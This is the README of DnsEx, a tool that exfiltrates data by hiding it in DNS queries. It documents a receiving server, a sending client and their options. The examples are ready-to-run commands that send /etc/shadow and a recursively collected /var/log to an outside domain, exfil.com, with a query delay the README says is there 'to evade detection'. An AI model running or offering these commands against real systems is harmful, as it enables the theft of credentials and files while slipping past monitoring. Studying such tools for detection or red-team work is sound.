# DnsEx

Data exfiltration tool that disguises arbitrary payloads and files as innocent DNS traffic.

---

### Server
The server acts as an authoritative DNS nameserver. It listens for incoming queries, reassembles the chunks, handles retransmissions, and saves the final files to disk.

**Usage:**
```bash
dnsex server [OPTIONS] --domain <DOMAIN>
```

**Options:**
```text
  -d, --domain <DOMAIN>   The base domain to listen for (e.g., exfil.com)
  -b, --bind <BIND>       IP to bind to [default: 0.0.0.0]
  -p, --port <PORT>       Port to listen on [default: 8053]
  -o, --output <PATH>     Output directory [default: "."]
  -h, --help              Print help
```

---

### Client
The client takes your local data, chunks it, encodes it, and sends it out over DNS queries to your server.

**Usage:**
```bash
dnsex client <PATH> --domain <DOMAIN> [OPTIONS]
```

**Options:**
```text
  -d, --domain <DOMAIN>        The target domain of your DnsEx server
  -p, --port <PORT>            The DNS port to target [default: 53]
      --rate-limit <LIMIT>     Delay between queries in ms [default: 100]
  -r  --recursive              Recursivly exfiltrate directory
  -h, --help                   Print help
```

---

## Examples

**Start the Server:**
Listen on the standard DNS port (requires root/sudo).
```bash
sudo dnsex server -d yourdomain.com -p 53
```

**Exfiltrate a file:**
Send a sensitive file with a 50ms delay between packets to evade detection.
```bash
dnsex client -d exfil.com --rate-limit 50 /etc/shadow
```

**Exfiltrate a directory recursivly:**
```bash
dnsex client -d exfil.com -r /var/log
```
